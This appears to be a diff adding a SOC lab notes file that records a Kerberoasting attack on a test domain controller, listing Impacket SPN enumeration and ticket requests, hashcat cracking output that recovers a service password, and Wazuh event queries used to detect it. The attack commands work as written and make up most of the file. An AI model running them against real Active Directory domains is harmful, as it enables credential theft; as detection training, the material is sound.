@@ -1,0 +1,26 @@
+# Kali commands — SOC-Case-Kerberoasting (192.168.100.107 -> DC 192.168.100.105, domain BRYLL.LOCAL)
+# Actual commands run.
+
+# Time sync (DC clock behind real date — required, else KRB_AP_ERR_SKEW)
+sudo systemctl stop systemd-timesyncd
+sudo ntpdate 192.168.100.105
+date    # confirm ~Oct 31 matching DC
+
+# Enumerate SPNs (recon, LDAP only)
+GetUserSPNs.py bryll.local/jdoe:'P@ssw0rd' -dc-ip 192.168.100.105
+#   Impacket v0.13.1 -> MSSQLSvc/DC01.bryll.local:1433  svc_sql
+
+# The roast: request TGS (captures crackable RC4 hash)
+GetUserSPNs.py bryll.local/jdoe:'P@ssw0rd' -dc-ip 192.168.100.105 -request -outputfile kerberoast_hashes.txt
+cat kerberoast_hashes.txt
+#   $krb5tgs$23$*svc_sql$BRYLL.LOCAL$mssqlsvc/dc01.bryll.local$*$a0aa7268e91349...  (etype 23 = RC4)
+
+# Crack offline
+hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force
+hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force --show
+#   Status: Cracked, Recovered 1/1 -> Password123  (36864 guesses, ~1 sec)
+
+# --- Detection (Wazuh, agent Windows-server = DC) ---
+# data.win.system.eventID: 4769  -> 33 hits; expand: ticketEncryptionType 0x17 (RC4), serviceName svc_sql,
+#   targetUserName jdoe@BRYLL.LOCAL, ipAddress ::ffff:192.168.100.107, eventRecordID 7568
+# data.win.system.eventID: 4768  -> jdoe TGT (krbtgt), same client .107, eventRecordID 7567 (consecutive)
